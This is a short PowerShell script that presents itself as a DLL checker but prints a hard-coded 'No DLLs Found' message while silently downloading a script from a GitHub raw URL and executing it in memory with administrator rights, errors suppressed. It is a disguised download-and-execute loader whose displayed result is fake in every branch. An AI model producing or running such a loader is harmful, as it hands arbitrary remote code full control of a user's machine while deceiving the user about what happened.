#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

Write-Host ""
Write-Host "No DLLs Found" -ForegroundColor Green
Write-Host ""

# Run external helper script
$remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/main/dllhelper.ps1"

try {

    $script = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing

    if ($script) {

        $sb = [scriptblock]::Create($script)

        & $sb
    }

}
catch {

    Write-Host "No DLLs Found" -ForegroundColor Red
}
